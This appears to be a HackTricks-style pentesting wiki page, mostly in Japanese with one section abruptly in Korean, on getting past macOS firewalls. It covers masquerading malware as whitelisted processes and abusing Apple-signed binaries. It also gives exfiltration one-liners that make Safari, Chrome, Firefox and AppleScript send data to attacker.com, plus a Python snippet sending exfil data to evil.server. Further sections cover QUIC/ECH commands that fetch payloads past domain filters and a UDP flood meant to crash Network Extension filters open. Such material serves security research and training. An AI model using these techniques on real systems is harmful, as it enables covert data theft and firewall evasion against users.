# macOS Firewall のバイパス

{{#include ../../banners/hacktricks-training.md}}

## 発見された techniques

以下の techniques は、一部の macOS firewall apps で機能することが確認されています。

### whitelist 名の悪用

- 例えば、malware に **`launchd`** のような、よく知られた macOS process の名前を付けて実行する

### Synthetic Click

- firewall が user に permission を求めた場合、malware に **allow をクリックさせる**

### **Apple signed binaries を使用する**

- **`curl`** など。また、**`whois`** のような他のものも使用できる

### よく知られた Apple domains

firewall は、**`apple.com`** や **`icloud.com`** など、よく知られた Apple domains への connections を許可している可能性があります。また、iCloud は C2 として使用できます。

### Generic Bypass

firewalls を bypass するために試せるアイデア

### 許可された traffic の確認

許可された traffic を把握することで、whitelist に登録されている可能性のある domains や、アクセスを許可されている applications を特定しやすくなります
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS 악용

DNS 해석은 **`mdnsreponder`** 서명된 애플리케이션을 통해 수행되며, 이 애플리케이션은 DNS 서버에 연결하도록 허용되어 있을 가능성이 높습니다.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Browser 앱을 통한

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### プロセスインジェクション経由

**inject code into a process** が可能で、そのプロセスが任意のサーバーへの接続を許可されている場合、firewall protections を bypass できます:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 直近の macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
2024年7月、Appleは、Screen Time の parental controls で使用されるシステム全体の「Web content filter」を破壊する、Safari/WebKit の critical bug を patch しました。
特別に細工された URI（例えば、double URL-encoded の「://」を含む URI）は、Screen Time ACL では認識されませんが、WebKit では受け入れられるため、リクエストが filter されずに送信されます。そのため、URLを開けるあらゆる process（sandboxed または unsigned code を含む）が、user または MDM profile によって明示的に block された domain に到達できます。<sup>[2]</sup>

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### 初期の macOS 14「Sonoma」における Packet Filter (PF) のルール順序付けバグ
macOS 14 の beta cycle 中、Apple は **`pfctl`** の userspace wrapper に regression を導入しました。
`quick` keyword を使用して追加されたルール（多くの VPN kill-switch で使用）は silently ignored され、VPN/firewall GUI が *blocked* と報告している場合でも traffic leak が発生しました。このバグは複数の VPN vendor によって確認され、RC 2 (build 23A344) で修正されました。

簡易 leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple署名済み helper services の悪用（legacy – macOS 11.2 より前）
macOS 11.2 より前は、**`ContentFilterExclusionList`** により、**`nsurlsessiond`** や App Store など約50個の Apple バイナリが、Network Extension framework で実装されたすべての socket-filter firewall（LuLu、Little Snitch など）をバイパスできました。
Malware は、除外された process を単純に spawn するか、そこへ code を inject することで、すでに許可されている socket 経由で自身の traffic を tunnel できました。Apple は macOS 11.2 で exclusion list を完全に削除しましたが、アップグレードできない systems ではこの technique が依然として relevant です。<sup>[3]</sup>

実証コードの例（11.2 より前）：
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECHでNetwork Extensionのドメインフィルターを回避（macOS 12以降）
NEFilter Packet/Data Providersは、TLS ClientHelloのSNI/ALPNを基準に処理します。**HTTP/3 over QUIC（UDP/443）**と**Encrypted Client Hello（ECH）**を使用するとSNIが暗号化されたままとなり、NetExtはフローを解析できません。その結果、ホスト名ルールがfail-openになることが多く、マルウェアはDNSに触れることなくブロック対象ドメインへアクセスできます。<sup>[5]</sup>

最小限のPoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
QUIC/ECHがまだ有効な場合、これはhostname-filterを回避する簡単な経路です。

### macOS 15「Sequoia」のNetwork Extension不安定性（2024–2025）
初期の15.0/15.1ビルドでは、サードパーティ製の**Network Extension**フィルター（LuLu、Little Snitch、Defender、SentinelOneなど）がクラッシュします。フィルターが再起動すると、macOSはフロールールを破棄し、多くの製品はfail-openになります。数千の短いUDPフローをフィルターに大量送信する（またはQUIC/ECHを強制する）ことで、クラッシュを繰り返し発生させ、GUI上ではファイアウォールが実行中と表示されたまま、C2/exfilのための時間枠を残せる可能性があります。<sup>[4]</sup>

簡単な再現（安全なlab環境）：
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 最新macOS向けのTooling tips

1. GUI firewallが生成する現在のPFルールを確認します。
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. すでに* outgoing-network * entitlementを保持しているbinaryを列挙します（piggy-backingに便利です）。
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swiftで独自のNetwork Extension content filterをプログラムから登録します。
ローカルsocketにpacketをforwardする最小限のrootless PoCは、Patrick Wardleの**LuLu** source codeで利用できます。

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
